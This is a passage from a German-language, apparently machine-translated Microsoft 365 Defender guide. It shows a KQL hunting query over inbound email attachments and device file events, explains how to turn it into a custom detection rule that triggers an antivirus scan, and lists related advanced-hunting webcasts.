    ```console
    EmailEvents
    | where AttachmentCount > 0 and EmailDirection == "Inbound"
    | project-rename EmailTimestamp=Timestamp
    | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
    | join DeviceFileEvents on SHA256
    | where ActionType == "FileCreated"
    | distinct SHA1
    | invoke FileProfile()
    ```

#### <a name="create-a-detection"></a>Erstellen einer Erkennung

Nachdem Sie eine Abfrage erstellt haben, die  Informationen identifiziert, über die Sie informiert werden sollen, wenn sie in Der Zukunft auftreten, können Sie eine benutzerdefinierte Erkennung aus der Abfrage erstellen.

Benutzerdefinierte Erkennungen führen die Abfrage entsprechend der von Ihnen festgelegten Häufigkeit aus, und die Ergebnisse der Abfragen erstellen Basierend auf den von Ihnen verwendeten Ressourcen Sicherheitswarnungen. Diese Warnungen werden mit Vorfällen korreliert und können als alle anderen Sicherheitswarnungen triaget werden, die von einem der Produkte generiert werden.

1. Entfernen Sie auf der Abfrageseite die Zeilen 7 und 8, die in Schritt 7 der Suchanweisungen hinzugefügt wurden, und klicken Sie auf **"Erkennungsregel erstellen".**

   ![Screenshot der Stelle, an der Sie auf der Seite "Erweiterte Suche" auf "Erkennungsregel erstellen" klicken können](../../media/mtp/fig22.png)

   > [!NOTE]
   > Wenn Sie auf **"Erkennungsregel erstellen"** klicken und die Abfrage Syntaxfehler enthält, wird die Erkennungsregel nicht gespeichert. Überprüfen Sie ihre Abfrage, um sicherzustellen, dass keine Fehler auftreten.

2. Füllen Sie die erforderlichen Felder mit den Informationen aus, die es dem Sicherheitsteam ermöglichen, die Warnung zu verstehen, warum sie generiert wurde und welche Aktionen sie ausführen soll.

   ![Screenshot der Seite "Erkennungsregel erstellen", auf der Sie die Warnungsdetails definieren können](../../media/mtp/fig23.png)

   Stellen Sie sicher, dass Sie die Felder mit Übersichtlichkeit ausfüllen, um dem nächsten Benutzer eine fundierte Entscheidung über diese Warnung zu erkennungsregel zu geben

3. Wählen Sie aus, welche Entitäten in dieser Warnung betroffen sind. Wählen Sie in diesem Fall **"Gerät und** **Postfach" aus.**

   ![Screenshot der Seite "Erkennungsregel erstellen", auf der Sie die Parameter der betroffener Entitäten auswählen können](../../media/mtp/fig24.png)

4. Bestimmen Sie, welche Aktionen beim Auslösen der Warnung stattfinden sollen. Führen Sie in diesem Fall einen Antivirenscan aus, es können jedoch auch andere Aktionen ausgeführt werden.

   ![Screenshot der Seite "Erkennungsregel erstellen", auf der Sie einen Antivirenscan ausführen können, wenn eine Warnung ausgelöst wird, um Bedrohungen zu adressieren](../../media/mtp/fig25.png)

5. Wählen Sie den Bereich für die Warnungsregel aus. Da diese Abfrage Geräte betreffen, sind die Gerätegruppen für diese benutzerdefinierte Erkennung entsprechend dem Microsoft Defender for Endpoint-Kontext relevant. Beim Erstellen einer benutzerdefinierten Erkennung, die keine Geräte als betroffener Entitäten enthält, gilt der Bereich nicht.

   ![Screenshot of the create detection rule page where you can set the scope for the alert rule manages your expectations for the results that you'll see](../../media/mtp/fig26.png)

   Für dieses Pilotprojekt sollten Sie diese Regel auf eine Teilmenge der Testgeräte in Ihrer Produktionsumgebung beschränken.

6. Wählen Sie **Erstellen** aus. Wählen Sie dann im **Navigationsbereich benutzerdefinierte** Erkennungsregeln aus.

   ![Screenshot der Option "Benutzerdefinierte Erkennungsregeln" im Menü](../../media/mtp/fig27a.png)

   ![Screenshot der Seite "Erkennungsregeln", auf der die Regel- und Ausführungsdetails angezeigt werden](../../media/mtp/fig27b.png)

   Auf dieser Seite können Sie die Erkennungsregel auswählen, die eine Detailseite öffnet.

   ![Screenshot der Seite "E-Mail-Anlagen", auf der Sie den Status der Regelausführung, ausgelöste Warnungen und Aktionen, die Erkennung bearbeiten und so weiter sehen können](../../media/mtp/fig28.png)

### <a name="additional-advanced-hunting-walk-through-exercises"></a>Weitere Exemplarischen Übungen für die erweiterte Suche

Um mehr über die erweiterte Suche zu erfahren, werden Sie in den folgenden Webcasts durch die Funktionen der erweiterten Suche in Microsoft 365 Defender zum Erstellen von säulenübergreifenden Abfragen, zum Pivotieren von Entitäten und zum Erstellen von benutzerdefinierten Erkennungs- und Korrekturaktionen unterstützt.

> [!NOTE]
> Bereiten Sie sich mit Ihrem eigenen GitHub-Konto vor, um die Suchabfragen in Ihrer Pilottestumgebung ausführen zu können.

|Titel|Beschreibung|MP4 herunterladen|Auf YouTube ansehen|Zu verwendende CSL-Datei|
|---|---|---|---|---|
|Teil 1: Grundlagen zu KQL|Wir werden die Grundlagen der erweiterten Funktionen für die Suche in Microsoft 365 Defender abdecken. Erfahren Sie mehr über die verfügbaren Daten zur erweiterten Suche sowie grundlegende #A0 und -Operatoren.|[MP4](https://aka.ms/MTP15JUL20_MP4)|[YouTube](https://youtu.be/0D9TkGjeJwM)|[Teil 1: CSL-Datei auf Git](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%201%20-%20KQL%20Fundamentals.csl)|
|Teil 2: Beitritte|We'll continue learning about data in advanced hunting and how to join tables together. Erfahren Sie mehr über innere, äußere, eindeutige und semi-Verknüpfungen sowie die Nuancen der standardmäßigen kusto innerunique-Verknüpfung.|[MP4](https://aka.ms/MTP22JUL20_MP4)|[YouTube](https://youtu.be/LMrO6K5TWOU)|[Teil 2: CSL-Datei auf Git](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%202%20-%20Joins.csl)|
|Teil 3: Zusammenfassung, Pivotieren und Visualisieren von Daten|Da wir nun In der Lage sind, Daten zu filtern, zu bearbeiten und zu verbinden, ist es an der Zeit, mit dem Zusammenfassen, Quantifizieren, Pivotieren und Visualisieren zu beginnen. In dieser Folge werden der Zusammenfassungsoperator und einige berechnungen, die Sie ausführen können, während Sie sich mit zusätzlichen Tabellen im Schema für die erweiterte Suche abmischen. Wir machen unsere Datasets zu Diagrammen, mit deren Hilfe die Analyse verbessert werden kann.|[MP4](https://aka.ms/MTP29JUL20_MP4)|[YouTube](https://youtu.be/UKnk9U1NH6Y)|[Teil 3: CSL-Datei auf Git](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%203%20-%20Summarizing%2C%20Pivoting%2C%20and%20Joining.csl)|
|Teil 4: Lassen Sie uns die Suche beginnen! Anwenden von KQL auf die Vorfallverfolgung|Zeit zum Nachverfolgen einiger Angreiferaktivitäten! In dieser Folge verwenden wir unser verbessertes Verständnis von KQL und der erweiterten Suche in Microsoft 365 Defender, um einen Angriff nachverfolgt zu haben. Erfahren Sie mehr über die Tipps und Tricks, die im Feld zum Nachverfolgen der Aktivitäten von Angreifern verwendet werden, einschließlich der AbCs der Cybersicherheit und wie Sie sie auf die Reaktion auf Vorfälle anwenden.|[MP4](https://aka.ms/MTP5AUG20_MP4)|[YouTube](https://youtu.be/2EUxOc_LNd8)|[Teil 4: CSL-Datei auf Git](https://github.com/microsoft/Microsoft-threat-protection-Hunting-Queries/blob/master/Webcasts/TrackingTheAdversary/Episode%204%20-%20Lets%20Hunt.csl)|
|

## <a name="next-step"></a>Nächster Schritt

|![Abschluss- und Zusammenfassungsphase](../../media/mtp/close.png) <br>[Abschluss- und Zusammenfassungsphase](mtp-pilot-close.md)|Analysieren Sie Ihr Microsoft 365 Defender-Pilotergebnis, stellen Sie es Ihren Beteiligten vor, und führen Sie den nächsten Schritt aus.
|:-----|:-----|
